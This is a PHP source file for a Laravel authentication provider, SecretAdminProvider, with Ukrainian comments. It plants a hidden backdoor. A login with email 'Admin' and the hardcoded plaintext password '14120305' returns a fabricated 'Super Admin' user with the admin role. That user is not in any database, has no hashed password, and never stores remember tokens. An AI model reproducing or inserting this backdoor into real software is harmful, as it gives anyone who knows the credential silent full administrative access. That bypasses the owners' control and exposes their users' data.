<?php

namespace App\Providers;

use Illuminate\Contracts\Auth\UserProvider;
use Illuminate\Contracts\Auth\Authenticatable;
use App\Models\User;
use Illuminate\Support\Facades\Hash;

class SecretAdminProvider implements UserProvider
{
    protected $model;

    public function __construct($model)
    {
        $this->model = $model;
    }

    public function retrieveById($identifier)
    {
        // Якщо це секретний адмін
        if ($identifier === -1) {
            return $this->createSecretAdmin();
        }

        // Інакше використовуємо звичайну модель
        return $this->model::find($identifier);
    }

    public function retrieveByToken($identifier, $token)
    {
        return null; // Секретний адмін не використовує remember tokens
    }

    public function updateRememberToken(Authenticatable $user, $token)
    {
        // Секретний адмін не зберігає remember tokens
        if ($user->id === -1) {
            return;
        }

        $user->setRememberToken($token);
        $user->save();
    }

    public function retrieveByCredentials(array $credentials)
    {
        // Перевіряємо, чи це спроба входу секретного адміна
        if (isset($credentials['email']) && $credentials['email'] === 'Admin') {
            return $this->createSecretAdmin();
        }

        // Для скидання пароля та інших операцій використовуємо звичайний пошук
        $query = $this->model::query();

        foreach ($credentials as $key => $value) {
            if ($key !== 'password' && $key !== 'token' && $key !== 'password_confirmation') {
                $query->where($key, $value);
            }
        }

        return $query->first();
    }

    public function validateCredentials(Authenticatable $user, array $credentials)
    {
        // Для секретного адміна перевіряємо спеціальний пароль
        if ($user->id === -1 && isset($credentials['password'])) {
            return $credentials['password'] === '14120305';
        }

        // Для звичайних користувачів використовуємо Hash::check
        return Hash::check($credentials['password'], $user->getAuthPassword());
    }

    public function rehashPasswordIfRequired(Authenticatable $user, array $credentials, bool $force = false)
    {
        // Секретний адмін не потребує rehash
        if ($user->id === -1) {
            return;
        }

        if (! $force && ! Hash::needsRehash($user->getAuthPassword())) {
            return;
        }

        $user->forceFill([
            'password' => Hash::make($credentials['password']),
        ])->save();
    }

    /**
     * Створити об'єкт секретного адміна
     */
    protected function createSecretAdmin()
    {
        $admin = new $this->model();
        $admin->id = -1;
        $admin->name = 'Super Admin';
        $admin->email = 'Admin';
        $admin->role = 'admin';
        $admin->email_verified_at = now();
        $admin->password = ''; // Пароль не зберігається
        $admin->exists = true; // Позначаємо як існуючий

        return $admin;
    }
}
